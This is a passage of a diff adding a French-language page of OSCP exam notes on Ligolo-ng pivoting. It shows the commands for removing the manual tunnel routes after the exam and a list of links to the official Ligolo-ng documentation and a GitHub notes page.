+```
+
+### Supprimer la route après l'examen
+
+Retirer les routes manuelles ajoutées pour la session, sans toucher aux routes VPN préexistantes.
+
+<p class="oscp-command-note">Sur Kali — terminal Linux.</p>
+
+```bash
+sudo ip route del 172.16.20.0/24 dev ligolo
+sudo ip route del 172.16.30.0/24 dev ligolo2
+```
+
+Si les interfaces ont été créées manuellement et ne servent plus, vérifier leurs usages avant `sudo ip link delete ligolo` ou `sudo ip link delete ligolo2`. Les routes créées automatiquement par des versions récentes peuvent être gérées par Ligolo.
+
+## Sources officielles
+
+- [Ligolo-ng — introduction et limites réseau](https://docs.ligolo.ng/)
+
+- [Ligolo-ng — Quickstart, interface, certificat et routage](https://docs.ligolo.ng/Quickstart/)
+
+- [Ligolo-ng — double pivot](https://docs.ligolo.ng/sample/double/)
+
+- [Ligolo-ng — listeners](https://docs.ligolo.ng/Listeners/)
+
+- [Ligolo-ng — accès au localhost de l'agent](https://docs.ligolo.ng/Localhost/)
+
+- [Ligolo-ng — configuration v0.8 et routes persistantes](https://docs.ligolo.ng/Config-File/)
+
+- [Notes krovs — tunnels complémentaires](https://github.com/krovs/oscp-notes/blob/main/docs/17_port_red_tun.md)
